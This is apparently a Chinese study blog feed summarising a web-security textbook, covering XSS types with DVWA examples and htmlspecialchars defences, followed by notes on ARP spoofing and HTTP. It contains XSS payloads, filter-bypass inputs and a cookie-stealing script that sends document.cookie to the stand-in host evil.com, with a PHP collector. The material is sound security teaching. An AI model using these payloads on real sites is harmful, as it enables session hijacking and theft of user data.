<p>如下，在formProcess_XSS目录下，创建index.html和index.php，添加如下代码：<br><strong>index.html</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS form process<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><strong>index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="comment">//echo $_SERVER['PHP_SELF'];</span></div><div class="line">    $user_name = $_POST[<span class="string">"username"</span>];</div><div class="line">    <span class="keyword">echo</span> $user_name;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>然后将formProcess_XSS目录丢到phpStudy的WWW目录下，浏览器访问<code>http://192.168.1.101/formProcess_XSS/index.html</code>，其中192.168.1.101表示虚拟服务器的地址，当在文本输入框中输入<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>，然后点击提交，就会触发XSS攻击，因为index.php未对用户输入的内容作处理，没有将html的字符处理为html实体，如下：</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E6%94%BB%E5%87%BB.png" alt="XSS攻击学习"><br>攻击者可以在<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>之间输入JavaScript代码，实现一定的攻击效果。在真实攻击中，攻击者不仅仅弹出一个框，通常使用<code>&lt;script src=&quot;http://www.secbug.org/x.txt&quot;&gt;&lt;/script&gt;</code>方式来加载外部脚本，而在<code>x.txt</code>中存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。</p>
<h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><p>XSS主要分为三类，反射型(经过后端，不经过数据库)、存储型(经过后端，经过数据库)、DOM型(不经过后端)。<br>反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器。</p>
<p>存储型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器。</p>
<p>DOM-XSS 的数据流向是：URL–&gt;浏览器 </p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS也被称为非持久性XSS。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。eg：</p>
<p><strong>index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $user_name = $_GET[<span class="string">"username"</span>];</div><div class="line">    <span class="keyword">echo</span> $user_name;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在上述代码中，index.php接收<code>username</code>值后再输出，若提交<code>index.php?username=HIM</code>，则程序将输出HIM，若恶意用户输入<code>index.php?username=&lt;script&gt;XSS恶意代码&lt;script/&gt;</code>，将会造成反射型攻击。</p>
<p>有人会问，我怎么可能自己去把HIM改成可以执行的恶意代码呢?这不是自己坑自己吗，但是一种情况是别人可能修改HIM为恶意代码，然后将这个恶意的URL发送给你。反射型XSS盗取用户cookie的过程如下：</p>
<ul>
<li>假设网站A存在XSS漏洞，发送可以触发该漏洞的特定代码到网站A上的目标用户HIM<br>恶意链接构造如下：<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">"http://www.foo.com/xss/xss.php?username=&lt;script src = http://www.evil.com/xss/hacker.js /&gt;凤姐最新性感视频&lt;/a&gt;</span></span></div></pre></td></tr></table></figure>
</li>
</ul>
<p>其中，<code>www.foo.com/xss/xss.php?username=</code> 是存在漏洞的网站A，执行盗取cookie操作的文件位于黑客的网站B，B网站主要有两个文件 <code>hacker.js</code>和 <code>hacker.php</code>。</p>
<p>hacker.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</div><div class="line">img.src = <span class="string">"http://www.evil.com/xss/hacker.php?username="</span> + <span class="built_in">document</span>.cookie;</div><div class="line"><span class="built_in">document</span>.body.append(img);</div></pre></td></tr></table></figure></p>
<p>hacker.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$cookie = $_GET[<span class="string">'username'</span>];</div><div class="line">var_dump($cookie);</div><div class="line">$myFile = <span class="string">"cookie.txt"</span>;</div><div class="line">file_put_contents($myFile, $cookie);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<ul>
<li>当用户点击了(凤姐最新性感视频)链接后，被攻击目标HIM用户在网站A的cookie将被黑客拿到，存到网站B的cookie.txt文件中。</li>
</ul>
<p><strong>DVWA—XSS(Reflected)</strong><br>（1）LOW<br>SOURCE:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Is there any input?</span></div><div class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</div><div class="line">    <span class="comment">// Feedback for end user</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>漏洞源于，对于接受用户数据的<code>name</code>参数没有进行过滤直接在网页中输出。</p>
<p>攻击代码：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>效果:<br><img src="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/DVWA-XSS-Reflect-LOW.png" alt="DVWA-XSS-Reflected-LOW"></p>
<p>（2）MEDIUM<br>SOURCE:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Is there any input?</span></div><div class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</div><div class="line">    <span class="comment">// Get input</span></div><div class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</div><div class="line"></div><div class="line">    <span class="comment">// Feedback for end user</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>上述代码在输出<code>name</code>参数中的数据之前，先利用<code>str_replace(find,replace,string,count))</code>函数将<code>&lt;script&gt;</code>替换为空。</p>
<p><strong>补充：</strong> <a href="https://www.cnblogs.com/xiaochaohuashengmi/archive/2011/12/08/2281155.html" target="_blank" rel="noopener">Php中”{}”大括号的用法总结</a>，上述代码<code>echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;</code>中，<code>${name}</code>与<code>$name</code>或<code>{$name}</code>是一样的。</p>
<p>攻击代码1，可以使用大写的<code>&lt;SCRIPT&gt;</code>：<code>&lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p>
<p>攻击代码2，通过HTML跨站：<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>。onerror 事件会在文档或图像加载过程中发生错误时被触发，支持该事件的HTML标签，<code>&lt;img&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;style&gt;</code>。</p>
<p>（3）HIGH<br>SOURCE:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Is there any input?</span></div><div class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</div><div class="line">    <span class="comment">// Get input</span></div><div class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</div><div class="line"></div><div class="line">    <span class="comment">// Feedback for end user</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>preg_replace()</code> 函数执行一个正则表达式的搜索和替换。<br>上述代码在输出<code>name</code>参数中的数据之前，先利用<code>preg_replace()</code>函数将含有<code>&lt;script&gt;</code>或替<code>&lt;SCRIPT&gt;</code>的部分替换为空。</p>
<p>攻击代码：通过HTML跨站：<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>。</p>
<p><strong>避免XSS反射型攻击</strong><br>利用<code>htmlspecialchars()</code>方法：把一些预定义的敏感字符转义为 HTML 实体。所有的跨站语句中基本都离不开这些符号，因而只需要这一个函数就阻止了XSS漏洞。</p>
<pre><code>&amp; （和号） 成为 &amp;amp;
&quot; （双引号） 成为 &amp;quot;
&apos; （单引号） 成为 &amp;#039;
&lt; （小于） 成为 &amp;lt;
&gt; （大于） 成为 &amp;gt;
</code></pre><p>如下php代码，阻止了上述利用<code>&lt;script&gt;</code>和<code>&lt;img&gt;</code>进行的XSS反射型攻击：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Is there any input?</span></div><div class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</div><div class="line">    <span class="comment">// Get input</span></div><div class="line">    $name = htmlspecialchars($_GET[ <span class="string">'name'</span> ]);</div><div class="line">    <span class="comment">// Feedback for end user</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">"Hello $&#123;name&#125;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>当在文本输入框输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>或<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>点击提交GET请求后，利用上述php代码中的<code>htmlspecialchars()</code>方法处理敏感字符后返回，避免XSS攻击。</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E9%A2%84%E9%98%B21.png" alt="XSS预防1"></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E9%A2%84%E9%98%B22.png" alt="XSS预防2"></p>
<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>存储型XSS又称为持久性XSS，存储型XSS是最危险的一种跨站脚本。</p>
<p>允许用户存储数据的Web应用程序都可能出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，此为存储型XSS。</p>
<p>存储型XSS与反射型XSS、DOM型XSS相比，有更高的隐蔽性，危害更大。反射型XSS、DOM型XSS都依赖用户手动去触发，而存储型XSS不需要。</p>
<p><strong>一个常见的存储型XSS场景实例</strong><br>当测试是否存在存储型XSS时，首先确定输入点与输出点。如在留言板测试存储型XSS漏洞，首先要找出留言内容输出(显示)的地方在标签内还是标签属性内，或者其他地方。</p>
<p>若输出数据在标签属性内，则XSS代码不会被执行，如<code>&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot; /&gt;</code>,因为<code>value</code>属性中的XSS代码被当作值处理，无法当作脚本执行，最终浏览器解析HTML时，将会把数据以文本的形式输出在网页中。</p>
<p>确定输出点后，可以根据相应的标签构造HTML代码来闭合，如插入XSS代码<code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，最终在HTML文档中变为：<code>&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot; /&gt;</code>，通过闭合input标签，使输出的内容不在value属性，造成XSS跨站攻击。</p>
<p><strong>具体的存储型XSS漏洞测试如下：</strong></p>
<ul>
<li>添加正常的留言，查找到显示标签。</li>
<li>若显示区域不在HTML属性内，可以直接使用XSS代码注入。若不确定内容输出的具体位置，可以使用模糊测试方案，XSS代码如下：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> 普通注入</div><div class="line">"/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> 闭合标签注入</div><div class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>'"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> 闭合标签注入</div></pre></td></tr></table></figure>
<ul>
<li>在插入盗取cookie的JavaScript代码后，攻击者将该含XSS代码的留言提交，若后端不加处理直接保存到数据库，当用户再次查看这段留言时，浏览器会把XSS代码认为是正常JS代码执行，盗取浏览该留言的用户cookie。</li>
</ul>
<p>参考博客<a href="https://blog.csdn.net/SKI_12/article/details/60465854" target="_blank" rel="noopener">通过DVWA学习存储型XSS漏洞</a>。</p>
<h3 id="DOM型-XSS"><a href="#DOM型-XSS" class="headerlink" title="DOM型 XSS"></a>DOM型 XSS</h3><p>基于DOM型的XSS不需要与服务器端交互，只发生在客户端处理数据阶段。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> temp = <span class="built_in">document</span>.URL; <span class="comment">//获取URL</span></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> index= <span class="built_in">document</span>.URL.indexOf(<span class="string">"content="</span>) + <span class="number">8</span>;</span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> par = temp.substring(index);</span></div><div class="line"><span class="javascript">    <span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(par)); <span class="comment">//获取输入内容</span></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>上述代码的意思是获取URL中的content参数的值，并且输出，若输入<code>http://www.secbug.org/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，就会产生XSS漏洞。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《Web安全深度剖析》学习总结, 本部分主要包括XSS原理及三种类型XSS攻击和预防。&lt;br&gt;一篇较好的博客&lt;a href=&quot;https://blog.csdn.net/u011781521/article/details/53894399&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XSS跨站脚本攻击(一)—-XSS攻击的三种类型&lt;/a&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Web Security" scheme="http://yoursite.com/tags/Web-Security/"/>
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>（一）Web安全深度剖析学习【基础+HTTP】</title>
    <link href="http://yoursite.com/2018/05/16/Web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/05/16/Web安全深度剖析学习/</id>
    <published>2018-05-16T11:55:17.000Z</published>
    <updated>2018-05-29T02:21:01.736Z</updated>
    
    <content type="html"><![CDATA[<p>《Web安全深度剖析》学习总结, 本部分主要包括WEB安全的基础知识和HTTP协议相关。<br><a id="more"></a></p>
<h1 id="Web安全简介"><a href="#Web安全简介" class="headerlink" title="Web安全简介"></a>Web安全简介</h1><p>Web服务默认运行在服务器的80端口之上(http服务器)，https服务器默认443端口。</p>
<p>服务器风险点如下图：<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E7%82%B9.png" alt="服务器风险点"><br>直接对目标攻击的三种手段：</p>
<ul>
<li><strong>C段渗透</strong>： 攻击者通过渗透同一网段内的一台主机，对目标主机进行ARP等手段的渗透。</li>
</ul>
<p><strong>ARP攻击：</strong> ARP（地址解析协议）位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行，无法对外网（互联网、非本区域内的局域网）进行攻击。</p>
<p><strong>ARP攻击原理：</strong> ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p>
<p>攻击者向电脑A发送一个伪造的ARP响应，告诉电脑A：电脑B的IP地址192.168.0.2对应的MAC地址是00-aa-00-62-c6-03，电脑A信以为真，将这个对应关系写入自己的ARP缓存表中，以后发送数据时，将本应该发往电脑B的数据发送给了攻击者。同样的，攻击者向电脑B也发送一个伪造的ARP响应，告诉电脑B：电脑A的IP地址192.168.0.1对应的MAC地址是00-aa-00-62-c6-03，电脑B也会将数据发送给攻击者。至此攻击者就控制了电脑A和电脑B之间的流量，他可以选择被动地监测流量，获取密码和其他涉密信息，也可以伪造数据，改变电脑A和电脑B之间的通信内容。</p>
<p>为了解决ARP攻击问题，可以在网络中的交换机上配置802.1x协议。IEEE 802.1x是基于端口的访问控制协议，它对连接到交换机的用户进行认证和授权。在交换机上配置802.1x协议后，攻击者在连接交换机时需要进行身份认证（结合MAC、端口、帐户、VLAN和密码等），只有通过认证后才能向网络发送数据。攻击者未通过认证就不能向网络发送伪造的ARP报文。</p>
<ul>
<li><p><strong>社会工程学</strong>：渗透服务器有时不只靠技术，即”攻城为下，攻心为上”，果然社会！！！</p>
</li>
<li><p><strong>Services</strong>: 很多传统攻击方式直接针对服务进行溢出。Web作为服务之一，有多种渗透方式。</p>
</li>
</ul>
<p><strong>缓冲区溢出攻击：</strong> 缓冲区溢出是指当计算机向缓冲区内填充数据位数时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。理想的情况是：程序会检查数据长度，而且并不允许输入超过缓冲区长度的字符。但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下隐患。操作系统所使用的缓冲区，又被称为“堆栈”，在各个操作进程之间，指令会被临时储存在“堆栈”当中，“堆栈”也会出现缓冲区溢出。</p>
<p>缓冲区溢出攻击利用了缓冲区溢出的漏洞，通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其它指令，以达到攻击的目的。利用缓冲区溢出攻击，可以导致程序运行失败、系统关机、重新启动等后果。</p>
<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>URL(统一资源定位符)，格式: <code>协议://服务器IP[:端口]/路径/[?查询]</code></p>
<p>Linux系统下， <code>curl http网址</code> 命令可以发起http请求，会返回页面的HTML数据。添加<code>-I</code>参数，即 <code>curl http网址 -I</code> 返回http响应头。</p>
<p>HTTP协议经历了三个版本：</p>
<ul>
<li>HTTP/0.9: 只接受GET一种请求方法，没有在通讯中指定版本号，且不支持请求头。由于该版本不支持POST方法，因此客户端无法向服务器传递太多信息。</li>
<li>HTTP/1.0: 第一个在通讯中指定版本号的HTTP协议版本，至今仍被广泛采用，特别是在代理服务器中。相对于HTTP 0.9 ,增加了POST和HEAD命令，增加了头信息，支持长连接（但默认还是使用短连接），缓存机制，以及身份认证，响应对象不只限于HTML，增加了状态码等。</li>
<li>HTTP/1.1: 目前主流的HTTP协议版本,使用最广泛。相对于HTTP 1.0，默认采用长连接，支持以管道方式在同时发送多个请求，以便降低线路负载，提高传输速度，请求与响应支持Host头域，Content-Length字段，分块传输编码，增加了PUT、DELETE等方法。</li>
<li>HTTP/2： 下一代HTTP协议，目前应用还比较少。特点，二进制协议、多路复用、数据流、头部压缩、随时复位、Server Push、优先权和依赖。</li>
</ul>
<h2 id="HTTP协议详解"><a href="#HTTP协议详解" class="headerlink" title="HTTP协议详解"></a>HTTP协议详解</h2><p>以HTTP/1.1为例，描述HTTP请求与响应如下。</p>
<p><strong>HTTP请求：</strong> 包括请求行(请求方法)、请求头(消息报头)、请求正文(请求体)。<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/http%E8%AF%B7%E6%B1%82.png" alt="http请求"><br>HTTP请求的第一行为请求行，由三部分组成，<code>POST</code>表示请求方法，<code>/login.php</code>表示请求路径(该域名根目录下的login.php)，<code>HTTP/1.1</code>表示HTTP版本。</p>
<p>第二行至空白行为HTTP请求头，<code>HOST</code>表示请求的主机地址，<code>User-Agent</code>表示浏览器标识。请求头由客户端自行设定。Google访问<a href="http://shirley5li.me/IFE-2018-CSS/animate.css_log/index.html" target="_blank" rel="noopener">http://shirley5li.me/IFE-2018-CSS/animate.css_log/index.html</a>的HTTP GET请求行和请求头如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /IFE-2018-CSS/animate.css_log/index.html HTTP/1.1</div><div class="line">Host: shirley5li.me</div><div class="line">Connection: keep-alive</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: _ga=GA1.2.2018838122.1520044936; _gid=GA1.2.1506554401.1526462676; Hm_lvt_06185a244e6f872c8aeab11a4e7b5db4=1526478354; Hm_lpvt_06185a244e6f872c8aeab11a4e7b5db4=1526528658</div><div class="line">If-Modified-Since: Sun, 06 May 2018 03:32:14 GMT</div></pre></td></tr></table></figure></p>
<p>空白行之后为请求正文(请求体)，请求正文是可选的，通常出现在POST方法中，GET方法不含请求体。</p>
<p><strong>HTTP响应：</strong> 包括响应行、响应头(消息报头)、响应正文(响应体)。<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/http%E5%93%8D%E5%BA%94.png" alt="http响应"><br>Google访问<a href="http://shirley5li.me/IFE-2018-CSS/animate.css_log/index.html" target="_blank" rel="noopener">http://shirley5li.me/IFE-2018-CSS/animate.css_log/index.html</a>的HTTP 响应行和响应头如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: GitHub.com</div><div class="line">Content-Type: text/html; charset=utf-8</div><div class="line">Last-Modified: Sun, 06 May 2018 03:32:14 GMT</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Expires: Thu, 17 May 2018 05:20:22 GMT</div><div class="line">Cache-Control: max-age=600</div><div class="line">Content-Encoding: gzip</div><div class="line">X-GitHub-Request-Id: FEEA:43E7:353D5D:46B7F2:5AFD0EBD</div><div class="line">Content-Length: 629</div><div class="line">Accept-Ranges: bytes</div><div class="line">Date: Thu, 17 May 2018 05:20:41 GMT</div><div class="line">Via: 1.1 varnish</div><div class="line">Age: 0</div><div class="line">Connection: keep-alive</div><div class="line">X-Served-By: cache-hkg17927-HKG</div><div class="line">X-Cache: MISS</div><div class="line">X-Cache-Hits: 0</div><div class="line">X-Timer: S1526534441.070496,VS0,VE229</div><div class="line">Vary: Accept-Encoding</div><div class="line">X-Fastly-Request-ID: da54366ec4de37d5adfc39dede5b758996befa2c</div></pre></td></tr></table></figure></p>
<h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><ul>
<li><p>GET<br>GET方法用于获取请求页面的指定信息(以实体的格式)，如果请求资源为动态脚本(非HTML)，则返回文本是Web容器解析后的HTML源代码，而不是源文件。如请求<code>index.jsp</code>，返回的不是<code>index.jsp</code>的源文件，而是经过解析后的HTML代码。GET方法可以通过查询参数携带数据传递给服务器端，但发送的数据会显示在浏览器，并且有长度限制。</p>
</li>
<li><p>HEAD<br>该方法除了服务器不返回响应体外，其他与GET相同。通常用来测试超链接的有效性、可访问性、最近的改变，攻击者编写扫描工具时通常用此方法，只测试资源是否存在，不返回消息主体，速度最快。</p>
</li>
<li><p>POST<br>POST与GET类似，区别是，GET没有请求体，POST包含请求体。POST多用于向服务器发送大量数据，安全性也较高一点。如上传文件、提交留言等。</p>
</li>
